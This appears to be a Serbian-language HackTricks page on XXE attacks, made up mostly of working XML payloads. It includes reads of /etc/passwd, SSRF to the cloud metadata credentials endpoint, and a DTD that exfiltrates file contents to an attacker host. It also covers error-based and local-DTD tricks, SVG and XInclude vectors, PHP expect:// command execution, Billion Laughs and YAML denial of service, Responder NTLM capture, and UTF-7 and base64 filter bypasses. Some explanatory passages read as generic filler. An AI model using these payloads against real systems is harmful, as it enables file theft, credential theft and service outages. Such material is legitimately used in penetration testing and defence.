# XXE - XEE - Eksterni XML entiteti

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


## Osnove XML-a

XML je jezik za obeležavanje dizajniran za skladištenje i prenos podataka, koji ima fleksibilnu strukturu koja omogućava korišćenje opisno nazvanih oznaka. Razlikuje se od HTML-a po tome što nije ograničen na skup predefinisanih oznaka. Značaj XML-a je opao sa porastom JSON-a, uprkos njegovoj početnoj ulozi u AJAX tehnologiji.

- **Prikaz podataka putem entiteta**: Entiteti u XML-u omogućavaju prikaz podataka, uključujući posebne karaktere poput `&lt;` i `&gt;`, koji odgovaraju `<` i `>` kako bi se izbegao sukob sa XML-ovim sistemom oznaka.

- **Definisanje XML elemenata**: XML omogućava definisanje tipova elemenata, koji opisuju kako bi elementi trebali biti strukturirani i kakav sadržaj mogu sadržati, od bilo kojeg tipa sadržaja do određenih podređenih elemenata.

- **Definicija tipa dokumenta (DTD)**: DTD-ovi su ključni u XML-u za definisanje strukture dokumenta i vrsta podataka koje može sadržati. Mogu biti interni, eksterni ili kombinacija oba, i vode način na koji su dokumenti formatirani i validirani.

- **Prilagođeni i eksterni entiteti**: XML podržava kreiranje prilagođenih entiteta unutar DTD-a radi fleksibilnog prikaza podataka. Eksterni entiteti, definisani URL-om, izazivaju sigurnosne probleme, posebno u kontekstu napada XML External Entity (XXE), koji iskorišćavaju način na koji XML parseri obrađuju eksterne izvore podataka: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Otkrivanje XXE-a pomoću parametarskih entiteta**: Za otkrivanje XXE ranjivosti, posebno kada konvencionalne metode ne uspevaju zbog sigurnosnih mera parsera, mogu se koristiti XML parametarski entiteti. Ovi entiteti omogućavaju korišćenje tehnika detekcije van opsega, poput pokretanja DNS upita ili HTTP zahteva ka kontrolisanoj domeni, radi potvrde ranjivosti.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Glavni napadi

**[Većina ovih napada je testirana korišćenjem sjajnih Portswiggers XEE laboratorija: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Testiranje novog entiteta

U ovom napadu ću testirati da li jednostavna deklaracija novog entiteta funkcioniše.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Čitanje fajla

Pokušajmo da pročitamo `/etc/passwd` na različite načine. Za Windows možete pokušati da pročitate: `C:\windows\system32\drivers\etc\hosts`

U ovom prvom slučaju, primetite da će i "_\*\*file:///\*\*etc/passwd_" za SISTEM raditi.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Ovaj drugi slučaj može biti koristan za izvlačenje fajla ako veb server koristi PHP (Nije slučaj sa Portswiggers laboratorijama)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
U ovom trećem slučaju primetite da deklarišemo `Element stockCheck` kao ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Lista direktorijuma

U aplikacijama zasnovanim na **Java**-i, moguće je **izlistati sadržaj direktorijuma** putem XXE-a sa payloadom kao što je prikazano (samo traženje direktorijuma umesto fajla):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE može biti korišćen za zloupotrebu SSRF-a unutar oblaka
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Slepa SSRF

Koristeći **prethodno komentisanu tehniku**, možete naterati server da pristupi serveru koji kontrolišete kako biste pokazali da je ranjiv. Ali, ako to ne funkcioniše, možda je zato što **XML entiteti nisu dozvoljeni**, u tom slučaju možete pokušati koristiti **XML parametarske entitete**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Slep" SSRF - Izvlačenje podataka izvan opsega

**Ovom prilikom ćemo naterati server da učita novi DTD sa zlonamernim payloadom koji će poslati sadržaj fajla putem HTTP zahteva (za višelinijske fajlove možete pokušati da ih izvučete putem** _**ftp://**_**). Ovo objašnjenje se zasniva na** [**Portswiggers labu ovde**](https://portswigger.net/web-security/xxe/blind)**.**

U datom zlonamernom DTD-u, sprovode se sledeći koraci za izvlačenje podataka:

### Primer zlonamernog DTD-a:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Koraci koje izvršava ovaj DTD uključuju:

1. **Definicija parametarskih entiteta:**
- Kreira se XML parametarski entitet `%file`, koji čita sadržaj datoteke `/etc/hostname`.
- Definiše se još jedan XML parametarski entitet `%eval`. Dinamički deklariše novi XML parametarski entitet `%exfiltrate`. Entitet `%exfiltrate` je podešen da izvrši HTTP zahtev ka serveru napadača, prosleđujući sadržaj entiteta `%file` u upitu URL-a.

2. **Izvršavanje entiteta:**
- Koristi se entitet `%eval`, što dovodi do izvršavanja dinamičke deklaracije entiteta `%exfiltrate`.
- Zatim se koristi entitet `%exfiltrate`, pokrećući HTTP zahtev ka određenom URL-u sa sadržajem datoteke.

Napadač hostuje ovaj zlonamerni DTD na serveru pod njihovom kontrolom, obično na URL-u poput `http://web-attacker.com/malicious.dtd`.

**XXE Payload:**
Da bi iskoristio ranjivu aplikaciju, napadač šalje XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ova payload definira XML parametarski entitet `%xxe` i uključuje ga unutar DTD-a. Kada se obradi od strane XML parsera, ova payload dohvaća eksterni DTD sa servera napadača. Parser zatim tumači DTD inline, izvršava korake navedene u zlonamjernom DTD-u i dovodi do izvlačenja datoteke `/etc/hostname` na server napadača.


### Greška bazirana na greškama (Eksterni DTD)

**U ovom slučaju ćemo naterati server da učita zlonamjerni DTD koji će prikazati sadržaj datoteke unutar poruke o grešci (ovo je samo važeće ako možete videti poruke o grešci).** [**Primer odavde.**](https://portswigger.net/web-security/xxe/blind)

Poruka o grešci pri parsiranju XML-a, koja otkriva sadržaj datoteke `/etc/passwd`, može se pokrenuti pomoću zlonamernog eksternog Document Type Definition (DTD). To se postiže sledećim koracima:

1. Definiše se XML parametarski entitet nazvan `file`, koji sadrži sadržaj datoteke `/etc/passwd`.
2. Definiše se XML parametarski entitet nazvan `eval`, koji uključuje dinamičku deklaraciju za drugi XML parametarski entitet nazvan `error`. Ovaj entitet `error`, kada se evaluira, pokušava da učita nepostojeću datoteku, uključujući sadržaj entiteta `file` kao njeno ime.
3. Poziva se entitet `eval`, što dovodi do dinamičke deklaracije entiteta `error`.
4. Pozivanje entiteta `error` rezultira pokušajem učitavanja nepostojeće datoteke, što proizvodi poruku o grešci koja uključuje sadržaj datoteke `/etc/passwd` kao deo imena datoteke.

Zlonamerni eksterni DTD može se pozvati pomoću sledećeg XML-a:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Prilikom izvršavanja, odgovor veb servera treba da uključuje poruku o grešci koja prikazuje sadržaj fajla `/etc/passwd`.


![](<../.gitbook/assets/image (223) (1).png>)

_**Molimo vas da primetite da nam eksterni DTD omogućava da uključimo jednu entitet unutar druge (****`eval`****), ali je to zabranjeno u internom DTD-u. Stoga, ne možete izazvati grešku bez korišćenja eksternog DTD-a (obično).**_

### **Greška zasnovana na greškama (sistemski DTD)**

Šta je sa ranjivostima slepog XXE-a kada su **blokirane interakcije van opsega** (eksterni konekcije nisu dostupne)?.

Propust u specifikaciji XML jezika može **otkriti osetljive podatke putem poruka o greškama kada se unutrašnje i spoljašnje deklaracije DTD-a mešaju**. Ovaj problem omogućava internu redefiniciju entiteta koji su spoljašnje deklarisani, olakšavajući izvršavanje napada zasnovanih na greškama XXE-a. Takvi napadi iskorišćavaju redefiniciju XML parametarskog entiteta, koji je prvobitno deklarisan u eksternom DTD-u, unutar internog DTD-a. Kada su van opsega konekcije blokirane od strane servera, napadači se moraju osloniti na lokalne DTD fajlove kako bi izveli napad, sa ciljem izazivanja greške u parsiranju radi otkrivanja osetljivih informacija.


Razmotrite scenarijum u kojem se na serverskom fajl sistemu nalazi DTD fajl na lokaciji `/usr/local/app/schema.dtd`, koji definiše entitet nazvan `custom_entity`. Napadač može izazvati grešku u parsiranju XML-a koja otkriva sadržaj fajla `/etc/passwd` slanjem hibridnog DTD-a na sledeći način:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Koraci koji su opisani izvršavaju se putem ovog DTD-a:

- Definicija XML parametarskog entiteta nazvanog `local_dtd` uključuje eksterni DTD fajl koji se nalazi na serverskom fajl sistemu.
- Dolazi do redefinicije XML parametarskog entiteta `custom_entity`, koji je prvobitno definisan u eksternom DTD-u, kako bi se obuhvatio [exploit zasnovan na XXE greškama](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ova redefinicija je dizajnirana da izazove grešku pri parsiranju, otkrivajući sadržaj fajla `/etc/passwd`.
- Korišćenjem entiteta `local_dtd`, eksterni DTD je uključen, obuhvatajući novo definisani `custom_entity`. Ova sekvencija radnji dovodi do emitovanja greške koju exploit cilja.

**Primer iz stvarnog sveta:** Sistemi koji koriste GNOME desktop okruženje često imaju DTD fajl na lokaciji `/usr/share/yelp/dtd/docbookx.dtd` koji sadrži entitet nazvan `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Kako ova tehnika koristi **interno DTD, prvo morate pronaći validan**. To možete uraditi **instaliranjem** istog **OS / softvera** koji koristi server i **pretraživanjem nekih podrazumevanih DTD-ova**, ili **preuzimanjem liste** podrazumevanih DTD-ova unutar sistema i **proverom** da li neki od njih postoji:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Za više informacija pogledajte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Pronalaženje DTD-ova unutar sistema

U sledećem impresivnom github repozitorijumu možete pronaći **putanje DTD-ova koje mogu biti prisutne u sistemu**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Osim toga, ako imate **Docker sliku žrtvenog sistema**, možete koristiti alatku iz istog repozitorijuma da **skenirate** **sliku** i **pronađete** putanju **DTD-ova** prisutnih unutar sistema. Pročitajte [Readme na github-u](https://github.com/GoSecure/dtd-finder) da biste saznali kako.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE putem Office Open XML parsera

Za detaljnije objašnjenje ovog napada, **proverite drugi deo [ovog sjajnog posta](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) sa Detectify-ja**.

Mogućnost **učitavanja Microsoft Office dokumenata nudi se mnogim veb aplikacijama**, koje zatim izvlače određene detalje iz tih dokumenata. Na primer, veb aplikacija može omogućiti korisnicima da uvezu podatke učitavanjem tabele u XLSX formatu. Da bi parser izvukao podatke iz tabele, neizbežno će morati da analizira barem jedan XML fajl.

Da biste testirali ovu ranjivost, potrebno je kreirati **Microsoft Office fajl koji sadrži XXE payload**. Prvi korak je kreiranje praznog direktorijuma u koji se dokument može raspakovati.

Kada se dokument raspakuje, XML fajl koji se nalazi na putanji `./unzipped/word/document.xml` treba otvoriti i urediti u željenom tekst editoru (kao što je vim). XML treba izmeniti tako da uključuje željeni XXE payload, često počevši od HTTP zahteva.

Izmenjeni XML redovi trebaju biti umetnuti između dva korena XML objekta. Važno je zameniti URL sa URL-om koji se može pratiti zahtevima.

Na kraju, fajl se može zapakovati kako bi se kreirao zlonamerni poc.docx fajl. Iz prethodno kreiranog direktorijuma "unzipped", treba pokrenuti sledeću komandu:

Sada se kreirani fajl može učitati na potencijalno ranjivu veb aplikaciju, i može se nadati da će se zahtev pojaviti u Burp Collaborator logovima.


### Jar: protokol

Protokol **jar** je dostupan isključivo unutar **Java aplikacija**. Namenjen je omogućavanju pristupa fajlovima unutar **PKZIP** arhive (npr. `.zip`, `.jar`, itd.), podržavajući lokalne i udaljene fajlove.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Da biste mogli pristupiti datotekama unutar PKZIP datoteka, **izuzetno je korisno zloupotrebiti XXE putem sistemskih DTD datoteka**. Pogledajte [ovaj odeljak da biste naučili kako zloupotrebiti sistemsko DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Postupak pristupa datoteci unutar PKZIP arhive putem jar protokola uključuje nekoliko koraka:

1. Napravi se HTTP zahtev za preuzimanje zip arhive sa određene lokacije, kao što je `https://download.website.com/archive.zip`.
2. HTTP odgovor koji sadrži arhivu privremeno se čuva na sistemu, obično na lokaciji poput `/tmp/...`.
3. Arhiva se zatim raspakuje kako bi se pristupilo njenom sadržaju.
4. Čita se određena datoteka unutar arhive, `file.zip`.
5. Nakon operacije, sve privremene datoteke koje su stvorene tokom ovog procesa se brišu.

Interesantna tehnika za prekid ovog procesa u drugom koraku uključuje održavanje otvorene veze sa serverom neodređeno dugo vreme prilikom serviranja arhivne datoteke. Alati dostupni na [ovom repozitorijumu](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) mogu se koristiti u tu svrhu, uključujući Python server (`slow_http_server.py`) i Java server (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Pisanje datoteka u privremeni direktorijum može pomoći u **povećanju druge ranjivosti koja uključuje putanju pretrage** (kao što su lokalno uključivanje datoteka, ubacivanje šablona, XSLT RCE, deserijalizacija itd).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Napad Milijardu Smehova

---

XML eksterni entitet (XXE) napad je sigurnosna ranjivost koja se javlja kada se aplikacija nepravilno obrađuje XML ulaz. Ova ranjivost omogućava napadaču da izvrši različite vrste napada, uključujući i DoS (Denial of Service) napade.

Jedan od najpoznatijih DoS napada koji se može izvesti putem XXE ranjivosti je "Billion Laugh" napad. Ovaj napad koristi XML entitete kako bi generisao ogroman broj ponavljajućih entiteta, što dovodi do preopterećenja resursa na serveru i onemogućava normalno funkcionisanje aplikacije.

Da bi izveo "Billion Laugh" napad, napadač kreira poseban XML dokument koji sadrži definiciju entiteta koja se ponavlja milijardu puta. Kada se ovaj dokument prosledi aplikaciji koja je ranjiva na XXE, server će pokušati da parsira XML i obradi sve entitete. Međutim, zbog velikog broja ponavljanja, server će biti preopterećen i može doći do pada ili usporenog rada aplikacije.

Ovaj napad može biti veoma destruktivan, jer može dovesti do nedostupnosti aplikacije za legitimne korisnike. Da bi se zaštitili od "Billion Laugh" napada, programeri trebaju pravilno obrađivati XML ulaz i implementirati odgovarajuće sigurnosne mehanizme kako bi sprečili XXE ranjivosti.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Napad

Yaml napad je tehnika koja se koristi za iskorišćavanje ranjivosti u parsiranju YAML (YAML Ain't Markup Language) datoteka. Ova tehnika omogućava napadaču da izvrši udaljeni kod ili izvrši druge zlonamerne radnje putem YAML datoteke.

Da bi se izveo Yaml napad, napadač mora da ubaci zlonamerni YAML kod u aplikaciju koja parsira YAML datoteke. Ova aplikacija može biti bilo koja koja podržava YAML format, kao što su web aplikacije, alati za konfiguraciju ili sistemi za automatizaciju.

Napadač može iskoristiti različite tehnike za izvršavanje Yaml napada, uključujući:

- **Injection**: Napadač može ubaciti zlonamerni YAML kod u postojeću YAML datoteku ili ga proslediti kao ulaz aplikaciji koja parsira YAML.
- **Entity Expansion**: Napadač može koristiti tehnike ekspanzije entiteta kako bi izazvao DoS (Denial of Service) napad ili otkrio osetljive informacije.
- **Remote Code Execution**: Napadač može ubaciti zlonamerni YAML kod koji će se izvršiti na serveru, omogućavajući mu da izvršava proizvoljan kod ili izvršava druge zlonamerne radnje.

Da bi se zaštitili od Yaml napada, preporučuje se sledeće:

- **Validacija unosa**: Aplikacije koje parsiraju YAML datoteke treba da vrše strogu validaciju unosa kako bi se sprečilo ubacivanje zlonamernog koda.
- **Ograničenje resursa**: Ograničavanje resursa koji se koriste za parsiranje YAML datoteka može pomoći u sprečavanju DoS napada.
- **Ažuriranje softvera**: Redovno ažuriranje softvera koji parsira YAML datoteke može pomoći u otklanjanju poznatih ranjivosti.

Yaml napad je ozbiljna pretnja za aplikacije koje koriste YAML format. Implementacija odgovarajućih sigurnosnih mera može pomoći u zaštiti od ovog tipa napada.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Napad kvadratnog naduvavanja

![](<../.gitbook/assets/image (531).png>)

#### Dobijanje NTML-a

Na Windows hostovima je moguće dobiti NTML heš korisnika veb servera postavljanjem responder.py handlera:
```bash
Responder.py -I eth0 -v
```
i slanjajući sledeći zahtev
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Onda možete pokušati da dešifrujete heš koristeći hashcat

## Skriveni XXE površinski

### XInclude

Kada integrišete klijentske podatke u serverske XML dokumente, poput onih u pozadinskim SOAP zahtevima, direktna kontrola nad XML strukturom često je ograničena, što otežava tradicionalne XXE napade zbog ograničenja u izmeni `DOCTYPE` elementa. Međutim, `XInclude` napad pruža rešenje omogućavajući umetanje spoljnih entiteta unutar bilo kog elementa podataka XML dokumenta. Ova metoda je efikasna čak i kada se može kontrolisati samo deo podataka unutar serverski generisanog XML dokumenta.

Da biste izvršili `XInclude` napad, mora se deklarisati `XInclude` namespace, i mora se navesti putanja do željenog spoljnog entiteta. U nastavku je sažet primer kako se može formulisati takav napad:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Pogledajte [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za više informacija!

### SVG - Slanje datoteka

Datoteke koje korisnici šalju određenim aplikacijama, a zatim se obrađuju na serveru, mogu iskoristiti ranjivosti u načinu rukovanja XML ili XML-sadržanim formatima datoteka. Uobičajeni formati datoteka poput office dokumenata (DOCX) i slika (SVG) temelje se na XML-u.

Kada korisnici **šalju slike**, te slike se obrađuju ili provjeravaju na serveru. Čak i za aplikacije koje očekuju formate poput PNG ili JPEG, **biblioteka za obradu slika na serveru može podržavati i SVG slike**. SVG, kao format temeljen na XML-u, može biti iskorišten od strane napadača za slanje zlonamjernih SVG slika, čime se izlaže server ranjivostima XXE (XML External Entity).

Primjer takvog napada prikazan je u nastavku, gdje zlonamjerna SVG slika pokušava čitati sistemsku datoteku:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Još jedna metoda uključuje pokušaj **izvršavanja komandi** putem PHP "expect" omotača:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
U oba slučaja, SVG format se koristi za pokretanje napada koji iskorištavaju mogućnosti obrade XML-a softvera servera, ističući potrebu za snažnom validacijom unosa i sigurnosnim merama.

Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za više informacija!

**Napomena: Prva linija pročitanog fajla ili rezultata izvršenja će se pojaviti UNUTAR kreiranog SVG-a. Dakle, morate biti u mogućnosti da pristupite kreiranom SVG-u.**

### **PDF - Slanje fajla**

Pročitajte sledeći post da **saznate kako iskoristiti XXE slanjem PDF** fajla:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Od x-www-urlencoded do XML-a

Ako POST zahtev prihvata podatke u XML formatu, možete pokušati da iskoristite XXE u tom zahtevu. Na primer, ako normalan zahtev sadrži sledeće:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Onda biste možda mogli poslati sledeći zahtev, sa istim rezultatom:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Od JSON-a do XEE

Da biste promenili zahtev, možete koristiti Burp ekstenziju nazvanu "**Content Type Converter**". [Ovde](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) možete pronaći ovaj primer:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Još jedan primer može se pronaći [ovde](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass-ovi za WAF i zaštite

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Ovo radi samo ako XML server prihvata `data://` protokol.

### UTF-7

Možete koristiti \[**"Encode Recipe**" od cyberchef-a ovde ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformišete u UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass protokola File:/

Ako web koristi PHP, umesto korišćenja `file:/` možete koristiti **php omotače** `php://filter/convert.base64-encode/resource=` da **pristupite internim fajlovima**.

Ako web koristi Java, možete proveriti [**jar protokol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML entiteti

Triks sa [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Možete kreirati **entitet unutar entiteta** enkodirajući ga sa **HTML entitetima** i zatim ga pozvati da **učita dtd**.\
